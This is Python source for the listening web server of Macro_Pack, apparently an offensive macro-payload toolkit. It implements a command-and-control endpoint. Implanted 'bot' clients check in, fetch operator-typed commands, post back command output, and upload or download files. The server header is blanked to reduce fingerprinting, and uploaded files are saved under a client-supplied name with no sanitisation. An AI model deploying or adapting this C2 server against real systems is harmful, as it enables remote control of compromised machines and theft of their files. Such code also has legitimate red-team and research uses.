
#!/usr/bin/python3.4
# encoding: utf-8


from flask import Flask, make_response, request
from functools import wraps
import os
# Import Needed modules
from flask import send_from_directory


import logging

from modules.mp_module import MpModule
from common.utils import getHostIp


webapp = Flask(__name__)

pendingResponse = ""
pendingInstruction = ""

def secure_http_response(func):
    """
    A decorator to remove server header information
    """
    @wraps(func)
    def __wrapper(*args, **kwargs):
        response = func(*args, **kwargs)
        response.headers['server'] = ''
        return response
    return __wrapper

@webapp.route('/')
@secure_http_response
def index():
    return make_response("OK")


@webapp.route('/q', methods=['GET', 'POST'])
@secure_http_response
def query():
    """ called by client to ask for instruction """

    # Send request to bot if any pending
    clientId = request.form['id']
    pendingInstruction = input(" %s >> " % clientId)

    return make_response(pendingInstruction)

@webapp.route('/h', methods=['GET', 'POST'])
@secure_http_response
def hello():
    """ called by client when signalling itself"""
    # Add bot to network if necessary
    clientId = request.form['id']
    ip = request.remote_addr
    logging.info("   [-] Hello from %s. - IP: %s" % (clientId, ip))
    return make_response("OK")


@webapp.route('/a', methods=['GET', 'POST'])
@secure_http_response
def answer():
    """ called by client when responding to command """
    #clientId = request.form['id']
    cmdOutput = request.form['cmdOutput']
    #logging.info("   [-] From %s received:\n %s " % (clientId,cmdOutput))
    logging.info(" %s \n " % (cmdOutput))
    return make_response("OK")


# This is the path to the upload directory
webapp.config['UPLOAD_FOLDER'] = '.'

# Route that will process the file upload
@webapp.route('/u', methods=['POST'])
@secure_http_response
def upload():
    # Get the name of the uploaded file
    file = request.files['uploadfile']
    if file:
        filename = file.filename
        logging.info("   [-] Uploaded: "+ filename)
        file.save(os.path.join(webapp.config['UPLOAD_FOLDER'], filename))
        return make_response("OK")


@webapp.route('/u/<path:filename>', methods=['GET', 'POST'])
@secure_http_response
def download(filename):

    uploads = webapp.config['UPLOAD_FOLDER']
    logging.info("   [-] Sending file: %s" % (os.path.join(uploads,filename)))
    return send_from_directory(directory=uploads, filename=filename)



class ListenServer(MpModule):


    def __init__(self, mpSession):
        self.listenPort = mpSession.listenPort
        self.listenRoot = mpSession.listenRoot
        webapp.config['UPLOAD_FOLDER'] = mpSession.listenRoot
        MpModule.__init__(self, mpSession)

    def run(self):
        """ Starts listening server"""

        logging.info (" [+] Starting Macro_Pack web server...")
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR) # Disable flask log if easier to debug
        logging.info ("   [-] Files in \"" + self.listenRoot + "\" folder are accessible using http://{ip}:{port}/u/".format(ip=getHostIp(), port=self.listenPort))
        logging.info ("   [-] Listening on port %s (ctrl-c to exit)..." % self.listenPort)

        # Run web server in another thread
        webapp.run(
            host="0.0.0.0",
            port=int(self.listenPort),
            #ssl_context=context
        )
